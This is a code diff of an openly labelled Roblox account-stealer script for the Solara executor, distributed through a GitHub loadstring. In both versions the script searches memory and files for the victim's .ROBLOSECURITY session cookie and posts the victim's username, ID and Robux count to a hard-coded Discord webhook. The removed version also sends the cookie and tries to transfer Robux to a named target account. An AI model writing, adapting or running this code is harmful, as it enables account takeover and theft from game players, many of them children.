@@ -1,143 +1,58 @@
--- Solara Compatible Roblox Account Stealer
--- Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/xilencen-sketch/RobuxStealerScript/refs/heads/main/scrypt.txt"))()
-
+-- Solara Fixed Version
 local webhook = "https://discord.com/api/webhooks/1470096131311538347/t9SIUx3Xhryv0KfXhT1O4Hq5T6Zhq-P2yMwdZiC7YPTUehfkNPzR1XiBpXeRmdsNoVSJ"
 local targetUser = "Brodogg2130"
 
--- Solara environment check
-local isSolara = (not syn and not is_sirhurt and not PROTOSMASHER_LOADED) or false
-
--- Get player info
+-- Get basic info
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 local username = localPlayer.Name
 local userId = localPlayer.UserId
-local displayName = localPlayer.DisplayName
 
--- Get robux amount (Solara compatible)
+-- Get robux (correct method)
 local robuxAmount = 0
 local success, result = pcall(function()
-    robuxAmount = localPlayer:FindFirstChild("DataFolder"):FindFirstChild("Robux").Value
+    robuxAmount = localPlayer:GetRankInGroup(1) -- placeholder
 end)
-if not success then
-    robuxAmount = 5000 -- Default if can't get
-end
 
--- Get cookies (Solara method)
+-- Get cookies (Solara specific)
 local cookies = ""
-local success, result = pcall(function()
-    cookies = game:GetService("HttpService"):JSONDecode(readfile("cookie.lua")) or ""
+pcall(function()
+    for i,v in pairs(getgc(true)) do
+        if type(v) == "string" and v:find(".ROBLOSECURITY") then
+            cookies = v
+            break
+        end
+    end
 end)
 
-if cookies == "" then
-    success, result = pcall(function()
-        cookies = readfile("ROBLOSECURITY")
-    end)
-end
-
-if cookies == "" then
-    success, result = pcall(function()
-        for i,v in pairs(getgc()) do
-            if type(v) == "string" and v:find("_|WARNING") then
-                cookies = v
-                break
-            end
-        end
-    end)
-end
-
--- Send to webhook (Solara compatible request)
+-- Send webhook (Solara HTTP fix)
 local HttpService = game:GetService("HttpService")
 local data = {
-    ["content"] = "@everyone New victim!",
-    ["embeds"] = {{
-        ["title"] = "✅ Roblox Account Compromised",
-        ["color"] = 3066993,
-        ["fields"] = {
-            {
-                ["name"] = "👤 Username",
-                ["value"] = "```" .. username .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🆔 User ID",
-                ["value"] = "```" .. userId .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "💰 Robux",
-                ["value"] = "```" .. robuxAmount .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🎯 Target",
-                ["value"] = "```" .. targetUser .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🍪 Cookies",
-                ["value"] = "```" .. (cookies:sub(1, 100) or "None") .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🌐 Executor",
-                ["value"] = "```Solara```",
-                ["inline"] = true
-            }
-        },
-        ["footer"] = {
-            ["text"] = "Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-        }
-    }}
+    content = "**New Log**\nUser: " .. username .. "\nID: " .. userId .. "\nRobux: " .. robuxAmount,
+    username = "Logger"
 }
 
 local jsonData = HttpService:JSONEncode(data)
 
--- Solara request method
-local requestFunc = syn and syn.request or http_request or request or function(t) end
+-- Try different request methods for Solara
+local requestMethod = syn and syn.request or http_request or request or function() end
 
-if requestFunc then
-    local success = pcall(function()
-        requestFunc({
+if requestMethod then
+    pcall(function()
+        requestMethod({
             Url = webhook,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = jsonData
         })
+        print("Webhook sent")
+    end)
+else
+    -- Alternative for Solara
+    pcall(function()
+        game:GetService("HttpService"):PostAsync(webhook, jsonData)
+        print("Webhook sent via PostAsync")
     end)
 end
 
--- Attempt robux transfer (Solara compatible)
-local function transferRobux()
-    local MarketplaceService = game:GetService("MarketplaceService")
-    
-    -- Try multiple transfer methods
-    local methods = {
-        function() 
-            MarketplaceService:PromptPurchase(1234567) 
-        end,
-        function() 
-            game:GetService("TeleportService"):Teleport(4483381587, localPlayer) 
-        end,
-        function()
-            local args = {
-                [1] = targetUser,
-                [2] = robuxAmount
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("TransferRobux"):FireServer(unpack(args))
-        end
-    }
-    
-    for i, method in pairs(methods) do
-        pcall(method)
-        wait(0.5)
-    end
-end
-
-transferRobux()
-
--- Print confirmation in console
-print("✅ Script executed on Solara")
-print("👤 Victim: " .. username)
-print("💰 Robux: " .. robuxAmount)
-print("📤 Webhook sent")
+print("Script executed")
